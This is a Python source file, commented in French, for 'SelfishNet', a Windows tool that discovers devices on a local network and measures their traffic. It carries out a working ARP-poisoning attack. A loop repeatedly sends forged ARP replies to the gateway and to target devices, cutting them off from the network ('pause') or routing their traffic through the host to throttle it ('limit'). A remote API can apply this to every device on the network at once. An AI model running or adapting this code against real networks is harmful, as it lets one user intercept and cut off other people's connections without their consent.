#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SelfishNet — Backend natif Windows (v1.1.0).

Fonctionnalités :
  * découverte passive + balayage ARP actif strictement filtré sur le sous-réseau local ;
  * mesure temps réel du débit (montant / descendant) et identification OUI hors-ligne ;
  * mode Pause : empoisonnement ARP corrigé (src=my_mac) + règles Pare-feu Windows ;
  * mode Limite : relais L2 Npcap avec Token Bucket (bridage logiciel en kb/s) ;
  * Safe Mode persistant (PC local + passerelle protégés de façon permanente), alias et minuteurs ;
  * nettoyage multi-langues des règles pare-feu (PowerShell Get-NetFirewallRule, indépendant de la langue Windows) ;
  * restauration ARP garantie à l'arrêt.
"""

import atexit
import ctypes
import ipaddress
import os
import subprocess
import sys
import threading
import time
from collections import defaultdict, deque

_HERE = os.path.dirname(os.path.realpath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import selfishnet_core as core
from selfishnet_core import (
    VERSION,
    DeviceAliasStore,
    RemoteAPIServer,
    RuleTimerManager,
    TokenBucket,
    get_vendor,
    is_valid_mac,
    normalize_mac,
    sort_key_ip,
    validate_ipv4,
    validate_rate,
    validate_safe_target,
)

RATE_WINDOW = 3.0
POISON_INTERVAL = 1.5
_ACTIVE_RULES = set()
_RULES_LOCK = threading.Lock()


def _state_dir():
    base = os.environ.get("PROGRAMDATA") or os.environ.get("LOCALAPPDATA") or os.path.expanduser("~")
    return os.path.join(base, "SelfishNet")


def is_user_admin():
    if os.name != "nt":
        return False
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def check_npcap_installed():
    """Vérifie la présence de la DLL Npcap/WinPcap sur Windows."""
    if os.name != "nt":
        return False
    sys_root = os.environ.get("SystemRoot", r"C:\Windows")
    candidates = [
        os.path.join(sys_root, "System32", "Npcap", "wpcap.dll"),
        os.path.join(sys_root, "System32", "wpcap.dll"),
    ]
    return any(os.path.isfile(p) for p in candidates)


def run_netsh(*args, timeout=10):
    cmd = ["netsh", "advfirewall", "firewall", *[str(a) for a in args]]
    try:
        proc = subprocess.run(
            cmd,
            shell=False,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        return proc.returncode, (proc.stdout + proc.stderr).strip()
    except FileNotFoundError:
        return 127, "netsh introuvable"
    except subprocess.TimeoutExpired:
        return 124, "timeout"


def run_powershell(script, timeout=15):
    """Exécute une commande PowerShell non interactive (indépendante de la locale Windows)."""
    cmd = ["powershell", "-NoProfile", "-NonInteractive", "-Command", script]
    try:
        proc = subprocess.run(
            cmd,
            shell=False,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        return proc.returncode, (proc.stdout + proc.stderr).strip()
    except FileNotFoundError:
        return 127, "powershell introuvable"
    except subprocess.TimeoutExpired:
        return 124, "timeout"


def firewall_rule_name(ip, direction):
    clean = str(ip).replace(".", "_").replace(":", "_")
    return f"SelfishNet-{direction}-{clean}"


def pause_ip(ip):
    """Bloque une adresse IPv4 dans les deux sens via le Pare-feu Windows."""
    address = validate_ipv4(ip)
    results = []
    for direction in ("In", "Out"):
        name = firewall_rule_name(address, direction)
        run_netsh("delete", "rule", f"name={name}")
        rc, out = run_netsh(
            "add", "rule",
            f"name={name}",
            "dir=in" if direction == "In" else "dir=out",
            "action=block",
            f"remoteip={address}",
            "enable=yes",
        )
        if rc == 0:
            with _RULES_LOCK:
                _ACTIVE_RULES.add(name)
        results.append((direction, rc, out))
    failures = [(direction, out) for direction, rc, out in results if rc != 0]
    if failures:
        raise RuntimeError("; ".join(f"{direction}: {out}" for direction, out in failures))
    return True


def free_ip(ip):
    address = validate_ipv4(ip)
    for direction in ("In", "Out"):
        name = firewall_rule_name(address, direction)
        run_netsh("delete", "rule", f"name={name}")
        with _RULES_LOCK:
            _ACTIVE_RULES.discard(name)


def free_all():
    return clear_selfishnet_rules()


def clear_selfishnet_rules():
    """Supprime toutes les règles créées par SelfishNet (100% indépendant de la langue Windows)."""
    removed = 0
    # 1) Suppression PowerShell locale-indépendante (fonctionne sur Windows FR, EN, DE, ES, etc.)
    rc, out = run_powershell(
        "$r = Get-NetFirewallRule -DisplayName 'SelfishNet-*' -ErrorAction SilentlyContinue; "
        "if ($r) { $c = @($r).Count; $r | Remove-NetFirewallRule -ErrorAction SilentlyContinue; Write-Output $c } "
        "else { Write-Output 0 }"
    )
    if rc == 0:
        try:
            removed = int((out.splitlines()[-1] if out else "0").strip())
        except ValueError:
            removed = 0
        with _RULES_LOCK:
            _ACTIVE_RULES.clear()
        return 0, f"{removed} règle(s) supprimée(s)"

    # 2) Repli sur les règles suivies en mémoire si PowerShell est indisponible
    with _RULES_LOCK:
        tracked = list(_ACTIVE_RULES)
        _ACTIVE_RULES.clear()
    for name in tracked:
        r_rc, _ = run_netsh("delete", "rule", f"name={name}")
        if r_rc == 0:
            removed += 1
    return 0, f"{removed} règle(s) supprimée(s)"


def _prefix_from_netmask(netmask_int):
    """Convertit un masque IPv4 entier (ex. 0xffffff00) en longueur de préfixe CIDR."""
    try:
        mask = int(netmask_int)
        if mask <= 0 or mask > 0xFFFFFFFF:
            return 24
        return bin(mask).count("1")
    except Exception:
        return 24


class WindowsNetwork:
    def __init__(self, state_dir=None):
        self.state_dir = state_dir or _state_dir()
        self.errors = []
        self.devices = {}
        self.targets = {}          # ip -> {"mac":..., "mode":"pause"|"limit", "rate":kbit}
        self._buckets = {}         # ip -> TokenBucket
        self.lock = threading.Lock()
        self._safe_lock = threading.Lock()
        self.stop_event = threading.Event()
        self.poison_thread = None
        self.sniffer = None
        self.iface = None
        self.my_ip = None
        self.gateway = None
        self.my_mac = None
        self.gateway_mac = None
        self.net = None
        self._broadcast = "255.255.255.255"
        self.initialized = False
        self._ARP = None
        self._IP = None
        self._Ether = None
        self._sendp = None
        self.win = defaultdict(deque)
        self.win_up = defaultdict(deque)
        self.win_down = defaultdict(deque)
        self.safe_file = os.path.join(self.state_dir, "safe_mode.json")
        self.safe_targets = self._load_safe()
        self.aliases = DeviceAliasStore(os.path.join(self.state_dir, "aliases.json"))
        self.timers = RuleTimerManager(self._on_timer_expire)
        self.api_server = None

    def _record_error(self, msg):
        self.errors.append(msg)
        if len(self.errors) > 100:
            self.errors = self.errors[-50:]

    def _on_timer_expire(self, ip):
        try:
            self.set_free(ip)
        except Exception as exc:
            self._record_error(f"Minuteur {ip} : {exc}")

    def _load_safe(self):
        raw = core.load_json(self.safe_file, default=[])
        cleaned = set()
        if isinstance(raw, list):
            for item in raw:
                try:
                    cleaned.add(validate_safe_target(str(item)))
                except ValueError:
                    continue
        return cleaned

    def _save_safe(self):
        try:
            with self._safe_lock:
                data = sorted(self.safe_targets)
            core.save_json_atomic(self.safe_file, data)
        except Exception as exc:
            self._record_error(f"Sauvegarde Safe Mode : {exc}")

    def is_safe(self, ip, mac=None):
        if ip in (self.my_ip, self.gateway):
            return True
        norm_mac = normalize_mac(mac) if mac else None
        if norm_mac and norm_mac in (self.my_mac, self.gateway_mac):
            return True
        with self._safe_lock:
            if ip and str(ip).strip().lower() in self.safe_targets:
                return True
            if norm_mac and norm_mac in self.safe_targets:
                return True
        return False

    def safe_add(self, target):
        clean = validate_safe_target(target)
        with self._safe_lock:
            self.safe_targets.add(clean)
        self._save_safe()
        # Libérer immédiatement si déjà ciblé
        if is_valid_mac(clean):
            for ip, cfg in list(self.summary().items()):
                if normalize_mac(cfg.get("mac")) == clean:
                    self.set_free(ip)
        else:
            if clean in self.summary():
                self.set_free(clean)
        return clean

    def safe_remove(self, target):
        clean = validate_safe_target(target)
        if clean in (
            (self.my_ip or "").lower(),
            (self.gateway or "").lower(),
            (self.my_mac or "").lower(),
            (self.gateway_mac or "").lower(),
        ):
            raise ValueError("Votre machine et la passerelle sont protégées de façon permanente.")
        with self._safe_lock:
            self.safe_targets.discard(clean)
        self._save_safe()
        return clean

    def _is_local_host(self, ip_str):
        if not ip_str or ip_str in ("0.0.0.0", "255.255.255.255", self._broadcast):
            return False
        if ip_str == self.my_ip:
            return True
        try:
            addr = ipaddress.IPv4Address(ip_str)
            if addr.is_multicast or addr.is_loopback:
                return False
            if self.net is not None:
                if addr == self.net.network_address or addr == self.net.broadcast_address:
                    return False
                return addr in self.net
            return addr.is_private
        except ValueError:
            return False

    def _detect_subnet(self, conf):
        prefix = 24
        try:
            my_addr = int(ipaddress.IPv4Address(self.my_ip))
            for network, netmask, gw, iface_name, _out_ip, _metric in conf.route.routes:
                if netmask in (0, 0xFFFFFFFF):
                    continue
                if str(iface_name) == str(self.iface) and (my_addr & netmask) == (network & netmask) and gw == "0.0.0.0":
                    prefix = _prefix_from_netmask(netmask)
                    break
        except Exception:
            prefix = 24
        self.net = ipaddress.IPv4Network(f"{self.my_ip}/{prefix}", strict=False)
        self._broadcast = str(self.net.broadcast_address)

    @staticmethod
    def _push_sample(q, now, size):
        q.append((now, size))
        while q and now - q[0][0] > RATE_WINDOW:
            q.popleft()

    @staticmethod
    def _window_kbit(q, now):
        if not q:
            return 0.0
        while q and now - q[0][0] > RATE_WINDOW:
            q.popleft()
        return sum(s for _, s in q) * 8.0 / 1000.0 / RATE_WINDOW

    def initialize(self):
        if not is_user_admin():
            raise PermissionError("SelfishNet Windows doit être exécuté en tant qu'administrateur.")
        if os.name == "nt" and not check_npcap_installed():
            raise RuntimeError(
                "Npcap n'est pas installé. Téléchargez et installez Npcap (https://npcap.com/#download) "
                "en activant le mode compatible WinPcap, puis relancez SelfishNet."
            )

        try:
            from scapy.all import ARP, AsyncSniffer, Ether, IP, conf, sendp
        except Exception as exc:
            raise RuntimeError(
                "Npcap/Scapy est requis. Installez Npcap en mode WinPcap "
                f"compatible puis relancez l'application. ({exc})"
            ) from exc

        self._ARP = ARP
        self._IP = IP
        self._Ether = Ether
        self._sendp = sendp

        route = conf.route.route("0.0.0.0")
        self.iface = route[0]
        self.my_ip = route[1]
        self.gateway = route[2]

        raw_mac = None
        try:
            iface_obj = conf.ifaces.get(self.iface) if hasattr(conf.ifaces, "get") else conf.ifaces[self.iface]
            raw_mac = getattr(iface_obj, "mac", None)
        except Exception:
            raw_mac = getattr(self.iface, "mac", None)
        self.my_mac = normalize_mac(raw_mac)

        if not self.iface or not self.gateway or not self.my_ip:
            raise RuntimeError("Impossible de déterminer l'interface réseau Windows ou la passerelle.")
        if not self.my_mac:
            raise RuntimeError("Impossible de déterminer l'adresse MAC de votre interface Windows.")

        self._detect_subnet(conf)
        self.gateway_mac = self.resolve_mac(self.gateway)
        if not self.gateway_mac:
            raise RuntimeError(f"Impossible de déterminer l'adresse MAC de la passerelle ({self.gateway}).")

        def handle(pkt):
            now = time.time()
            try:
                if pkt.haslayer(ARP):
                    arp = pkt[ARP]
                    ip = arp.psrc
                    mac = normalize_mac(arp.hwsrc)
                    if ip and self._is_local_host(ip):
                        with self.lock:
                            item = self.devices.setdefault(ip, {
                                "ip": ip, "mac": mac, "last": now, "packets": 0, "bytes": 0,
                            })
                            item["last"] = now
                            item["packets"] += 1
                            if mac:
                                item["mac"] = mac
                    return

                if not pkt.haslayer(IP):
                    return
                ip_layer = pkt[IP]
                src, dst, size = ip_layer.src, ip_layer.dst, len(pkt)
                eth_src = normalize_mac(pkt[Ether].src) if pkt.haslayer(Ether) else None

                # Ignorer les paquets déjà réémis par notre propre NIC pour le compte d'un tiers
                if eth_src and eth_src == self.my_mac and src != self.my_ip and dst != self.my_ip:
                    return

                # Relais L2 Token Bucket pour les appareils en mode 'limit'
                self._maybe_relay_limited_packet(pkt, src, dst, eth_src, size)

                src_local = src != self.gateway and self._is_local_host(src)
                dst_local = dst != self.gateway and self._is_local_host(dst)
                if not src_local and not dst_local:
                    return

                with self.lock:
                    if src_local:
                        item = self.devices.setdefault(src, {
                            "ip": src,
                            "mac": eth_src if src != self.my_ip else self.my_mac,
                            "last": now, "packets": 0, "bytes": 0,
                        })
                        if not item.get("mac") and eth_src and eth_src != self.my_mac:
                            item["mac"] = eth_src
                        item["last"] = now
                        item["packets"] += 1
                        item["bytes"] += size
                        self._push_sample(self.win[src], now, size)
                        self._push_sample(self.win_up[src], now, size)
                    if dst_local and dst != src:
                        item = self.devices.setdefault(dst, {
                            "ip": dst, "mac": None, "last": now, "packets": 0, "bytes": 0,
                        })
                        item["last"] = now
                        item["packets"] += 1
                        item["bytes"] += size
                        self._push_sample(self.win[dst], now, size)
                        self._push_sample(self.win_down[dst], now, size)
            except Exception:
                pass

        self.sniffer = AsyncSniffer(
            iface=self.iface,
            prn=handle,
            store=False,
            filter="arp or ip",
        )
        self.sniffer.start()

        now = time.time()
        with self.lock:
            self.devices.setdefault(self.my_ip, {
                "ip": self.my_ip, "mac": self.my_mac, "last": now, "packets": 0, "bytes": 0,
            })
            self.devices.setdefault(self.gateway, {
                "ip": self.gateway, "mac": self.gateway_mac, "last": now, "packets": 0, "bytes": 0,
            })

        self.initialized = True
        self.poison_thread = threading.Thread(
            target=self._poison_loop,
            name="SelfishNetARP",
            daemon=True,
        )
        self.poison_thread.start()
        atexit.register(self.stop)
        threading.Thread(target=self.rescan, daemon=True, name="SelfishNetScan").start()
        return True

    def _maybe_relay_limited_packet(self, pkt, src, dst, eth_src, size):
        """Relaye les paquets des appareils en mode 'limit' sous contrôle du TokenBucket."""
        if not pkt.haslayer(self._Ether) or not self._sendp:
            return
        with self.lock:
            t_src = self.targets.get(src)
            t_dst = self.targets.get(dst)
            bucket_src = self._buckets.get(src) if t_src and t_src.get("mode") == "limit" else None
            bucket_dst = self._buckets.get(dst) if t_dst and t_dst.get("mode") == "limit" else None

        # Sens montant : victime -> nous -> passerelle
        if bucket_src and eth_src == t_src.get("mac"):
            if bucket_src.consume(size):
                fwd = pkt.copy()
                fwd[self._Ether].src = self.my_mac
                fwd[self._Ether].dst = self.gateway_mac
                try:
                    self._sendp(fwd, iface=self.iface, verbose=0)
                except Exception:
                    pass
            return

        # Sens descendant : passerelle -> nous -> victime
        if bucket_dst and eth_src == self.gateway_mac:
            if bucket_dst.consume(size):
                fwd = pkt.copy()
                fwd[self._Ether].src = self.my_mac
                fwd[self._Ether].dst = t_dst["mac"]
                try:
                    self._sendp(fwd, iface=self.iface, verbose=0)
                except Exception:
                    pass

    def rescan(self):
        """Balayage ARP actif du sous-réseau local."""
        if not self.initialized or self.net is None:
            return 0
        if self.net.num_addresses > 1024:
            self._record_error(f"Sous-réseau trop large pour balayage ARP ({self.net})")
            return 0
        try:
            from scapy.all import ARP, Ether, srp
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(self.net))
            answers, _ = srp(pkt, iface=self.iface, timeout=1.8, retry=1, verbose=0)
            now = time.time()
            found = 0
            for _, received in answers:
                if received.haslayer(ARP):
                    ip = received[ARP].psrc
                    mac = normalize_mac(received[ARP].hwsrc)
                    if ip and self._is_local_host(ip):
                        with self.lock:
                            item = self.devices.setdefault(ip, {
                                "ip": ip, "mac": mac, "last": now, "packets": 1, "bytes": 64,
                            })
                            item["last"] = now
                            if mac:
                                item["mac"] = mac
                        found += 1
            return found
        except Exception as exc:
            self._record_error(f"Balayage ARP : {exc}")
            return 0

    def resolve_mac(self, ip):
        try:
            valid_ip = validate_ipv4(ip)
        except ValueError:
            return None
        try:
            from scapy.all import ARP, Ether, srp
            packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=valid_ip)
            answers, _ = srp(packet, iface=self.iface, timeout=1.0, retry=1, verbose=0)
            for _, received in answers:
                if received.haslayer(ARP):
                    found = normalize_mac(received[ARP].hwsrc)
                    if found:
                        return found
        except Exception as exc:
            self._record_error(str(exc))
        return None

    def _build_poison_packets(self, ip, mac):
        norm_mac = normalize_mac(mac)
        if not norm_mac or not self.my_mac or not self.gateway_mac or not self.gateway:
            return []
        valid_ip = validate_ipv4(ip)
        return [
            self._Ether(dst=norm_mac, src=self.my_mac) / self._ARP(
                op=2, psrc=self.gateway, hwsrc=self.my_mac,
                pdst=valid_ip, hwdst=norm_mac,
            ),
            # src=self.my_mac (jamais src=norm_mac : évite le rejet Wi-Fi/switch)
            self._Ether(dst=self.gateway_mac, src=self.my_mac) / self._ARP(
                op=2, psrc=valid_ip, hwsrc=self.my_mac,
                pdst=self.gateway, hwdst=self.gateway_mac,
            ),
        ]

    def _poison_loop(self):
        while not self.stop_event.wait(POISON_INTERVAL):
            with self.lock:
                targets = {
                    ip: dict(cfg) for ip, cfg in self.targets.items()
                    if cfg.get("mode") in ("pause", "limit")
                }
            packets = []
            for ip, cfg in targets.items():
                mac = normalize_mac(cfg.get("mac"))
                if not mac:
                    continue
                try:
                    packets.extend(self._build_poison_packets(ip, mac))
                except Exception as exc:
                    self._record_error(f"Construction ARP {ip} : {exc}")
            if packets and self._sendp:
                try:
                    self._sendp(packets, iface=self.iface, verbose=0)
                except Exception as exc:
                    self._record_error(f"ARP : {exc}")

    def total_kbit(self):
        now = time.time()
        total = 0.0
        with self.lock:
            for q in self.win.values():
                while q and now - q[0][0] > RATE_WINDOW:
                    q.popleft()
                total += sum(s for _, s in q)
        return total * 8.0 / 1000.0 / RATE_WINDOW

    def snapshot(self):
        now = time.time()
        with self.lock:
            devices = []
            for ip, item in self.devices.items():
                if self.net is not None and ip != self.my_ip:
                    try:
                        if ipaddress.IPv4Address(ip) not in self.net:
                            continue
                    except ValueError:
                        continue
                mac = normalize_mac(item.get("mac"))
                kbit = self._window_kbit(self.win.get(ip), now)
                up_kbit = self._window_kbit(self.win_up.get(ip), now)
                down_kbit = self._window_kbit(self.win_down.get(ip), now)
                devices.append({
                    "ip": ip,
                    "mac": mac or "?",
                    "vendor": get_vendor(mac) if mac else "",
                    "alias": self.aliases.get(mac=mac, ip=ip),
                    "age": max(0.0, now - item["last"]),
                    "packets": item["packets"],
                    "pkts": item["packets"],
                    "kbit": kbit,
                    "up_kbit": up_kbit,
                    "down_kbit": down_kbit,
                    "is_self": ip == self.my_ip,
                    "is_gateway": ip == self.gateway,
                    "is_safe": self.is_safe(ip, mac),
                })
        devices.sort(key=lambda item: (
            0 if item["is_self"] else (1 if item["is_gateway"] else 2),
            -item["kbit"],
            sort_key_ip(item["ip"]),
        ))
        return devices

    def _resolve_target_mac(self, address):
        with self.lock:
            mac = normalize_mac((self.devices.get(address) or {}).get("mac"))
        if not mac:
            mac = self.resolve_mac(address)
        return mac

    def set_pause(self, ip, duration=None):
        address = validate_ipv4(ip)
        mac = self._resolve_target_mac(address)
        if self.is_safe(address, mac):
            raise ValueError(f"{address} est protégé (Safe Mode / PC local / Passerelle).")
        if not mac:
            raise RuntimeError(f"Impossible de résoudre la MAC de {address}")
        pause_ip(address)
        with self.lock:
            self.targets[address] = {"mac": mac, "mode": "pause", "rate": None}
            self._buckets.pop(address, None)
        if duration and duration > 0:
            self.timers.set_timer(address, duration)
        else:
            self.timers.cancel(address)

    def set_limit(self, ip, rate_kbit=500, duration=None):
        address = validate_ipv4(ip)
        rate = validate_rate(rate_kbit)
        mac = self._resolve_target_mac(address)
        if self.is_safe(address, mac):
            raise ValueError(f"{address} est protégé (Safe Mode / PC local / Passerelle).")
        if not mac:
            raise RuntimeError(f"Impossible de résoudre la MAC de {address}")
        # Retirer une éventuelle règle pare-feu de pause pour laisser le relais L2 opérer
        free_ip(address)
        with self.lock:
            self.targets[address] = {"mac": mac, "mode": "limit", "rate": rate}
            if address in self._buckets:
                self._buckets[address].update_rate(rate)
            else:
                self._buckets[address] = TokenBucket(rate)
        if duration and duration > 0:
            self.timers.set_timer(address, duration)
        else:
            self.timers.cancel(address)

    def set_free(self, ip):
        address = validate_ipv4(ip)
        self.timers.cancel(address)
        free_ip(address)
        with self.lock:
            prev = self.targets.pop(address, None)
            self._buckets.pop(address, None)
            dev_mac = normalize_mac((self.devices.get(address) or {}).get("mac"))
        mac = normalize_mac((prev or {}).get("mac")) or dev_mac
        if mac:
            self.restore_arp(address, mac)

    def restore_arp(self, ip, mac):
        norm_mac = normalize_mac(mac)
        if not norm_mac or not self._ARP or not self._Ether or not self._sendp:
            return
        if not self.gateway_mac or not self.gateway:
            return
        try:
            valid_ip = validate_ipv4(ip)
            packets = [
                self._Ether(dst=norm_mac, src=self.gateway_mac) / self._ARP(
                    op=2, psrc=self.gateway, hwsrc=self.gateway_mac,
                    pdst=valid_ip, hwdst=norm_mac,
                ),
                self._Ether(dst=self.gateway_mac, src=norm_mac) / self._ARP(
                    op=2, psrc=valid_ip, hwsrc=norm_mac,
                    pdst=self.gateway, hwdst=self.gateway_mac,
                ),
            ]
            self._sendp(packets, iface=self.iface, verbose=0, count=5, inter=0.15)
        except Exception as exc:
            self._record_error(f"restauration ARP : {exc}")

    def free_all_targets(self):
        self.timers.cancel_all()
        with self.lock:
            targets = dict(self.targets)
            self.targets.clear()
            self._buckets.clear()
        for ip, cfg in targets.items():
            free_ip(ip)
            mac = normalize_mac(cfg.get("mac"))
            if mac:
                self.restore_arp(ip, mac)
        clear_selfishnet_rules()

    def summary(self):
        timers = self.timers.snapshot()
        with self.lock:
            out = {}
            for ip, cfg in self.targets.items():
                entry = dict(cfg)
                if ip in timers:
                    entry["remaining_sec"] = timers[ip]
                out[ip] = entry
            return out

    # -- Interface unifiée compatible avec RemoteAPIServer (Android Companion)
    def handle_command(self, req):
        cmd = req.get("cmd")
        if cmd == "ping":
            return {"ok": True, "version": VERSION, "platform": "windows", "iface": str(self.iface)}
        if cmd == "status":
            t_map = self.summary()
            targets_list = [{"ip": ip, **cfg} for ip, cfg in t_map.items()]
            with self._safe_lock:
                safe_list = sorted(self.safe_targets)
            return {
                "ok": True,
                "version": VERSION,
                "platform": "windows",
                "iface": str(self.iface),
                "my_ip": self.my_ip,
                "gateway": self.gateway,
                "devices": self.snapshot(),
                "targets": targets_list,
                "safe": safe_list,
                "aliases": self.aliases.all(),
                "total_kbit": self.total_kbit(),
                "errors": self.errors[-5:],
            }
        if cmd in ("rescan", "refresh"):
            threading.Thread(target=self.rescan, daemon=True).start()
            return {"ok": True, "message": "Balayage ARP actif en cours..."}
        if cmd == "free_all":
            self.free_all_targets()
            return {"ok": True, "message": "Tous les appareils libérés."}
        if cmd == "safe_add":
            try:
                clean = self.safe_add(req.get("target", ""))
                return {"ok": True, "message": f"{clean} protégé (Safe Mode)."}
            except ValueError as exc:
                return {"error": str(exc)}
        if cmd == "safe_remove":
            try:
                clean = self.safe_remove(req.get("target", ""))
                return {"ok": True, "message": f"{clean} retiré du Safe Mode."}
            except ValueError as exc:
                return {"error": str(exc)}
        if cmd == "safe_list":
            with self._safe_lock:
                safe_list = sorted(self.safe_targets)
            return {"ok": True, "safe": safe_list, "my_ip": self.my_ip, "gateway": self.gateway}
        if cmd == "alias_set":
            try:
                key, name = self.aliases.set(req.get("target", ""), req.get("name", ""))
                return {"ok": True, "key": key, "name": name, "message": f"Alias mis à jour pour {key}"}
            except ValueError as exc:
                return {"error": str(exc)}
        if cmd == "alias_list":
            return {"ok": True, "aliases": self.aliases.all()}
        if cmd == "set":
            mode = req.get("mode", "pause")
            rate = req.get("rate", 500)
            duration = req.get("duration")
            raw_targets = str(req.get("targets", "")).strip()
            if raw_targets.lower() in ("all", "*", "local"):
                ips = [d["ip"] for d in self.snapshot() if not d["is_safe"]]
            else:
                ips = [p.strip() for p in raw_targets.split(",") if p.strip()]
            applied = []
            for ip in ips:
                try:
                    if mode == "pause":
                        self.set_pause(ip, duration=duration)
                    elif mode == "limit":
                        self.set_limit(ip, rate_kbit=rate, duration=duration)
                    elif mode == "free":
                        self.set_free(ip)
                    applied.append(ip)
                except Exception as exc:
                    self._record_error(f"{mode} {ip} : {exc}")
            return {"ok": True, "applied": applied, "message": f"{mode} appliqué sur {len(applied)} appareil(s)."}
        return {"error": f"commande inconnue : {cmd}"}

    def start_api(self, port=8443, host="0.0.0.0", token=None):
        if self.api_server:
            return self.api_server.pairing_uri(self.my_ip)
        self.api_server = RemoteAPIServer(
            self.handle_command,
            host=host,
            port=port,
            token=token,
            device_name="SelfishNet-Windows",
        )
        self.api_server.start()
        return self.api_server.pairing_uri(self.my_ip)

    def stop(self):
        if self.stop_event.is_set():
            return
        self.stop_event.set()
        self.timers.cancel_all()
        if self.api_server:
            self.api_server.stop()
            self.api_server = None
        if self.poison_thread:
            self.poison_thread.join(timeout=3)
        if self.sniffer:
            try:
                self.sniffer.stop()
            except Exception:
                pass
        if self.initialized:
            self.free_all_targets()
